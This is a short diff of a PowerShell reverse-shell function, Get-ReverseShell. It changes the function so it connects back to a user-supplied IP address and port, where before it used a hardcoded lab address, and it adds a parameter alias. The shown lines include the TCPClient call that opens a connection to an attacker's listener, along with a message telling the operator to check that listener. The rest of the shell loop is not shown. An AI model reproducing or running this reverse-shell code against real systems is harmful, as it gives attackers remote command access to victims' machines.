@@ -14,13 +14,13 @@ Function Get-ReverseShell {
                 [Alias('IP')]
                 [ValidateNotNullorEmpty()]
             [IPAddress]$IpAddress
-            
+
             [Parameter(
                 Mandatory=$True,
                 Position=1,
                 ValueFromPipeline=$False
             )] # End Parameter
-                [Alias('p')]
+                [Alias('p','P')]
                 [ValidateNotNullorEmpty()]
                 [ValidateRange(1,65535)]
             [int32]$Port
@@ -38,7 +38,7 @@ Function Get-ReverseShell {
 
             Write-Host "Connection attempted. Check your listener." -ForegroundColor 'Green'
 
-            $Client = New-Object System.Net.Sockets.TCPClient("192.168.227.128",8888)
+            $Client = New-Object System.Net.Sockets.TCPClient($IpAddress,$Port)
 
             $Stream = $Client.GetStream()
 
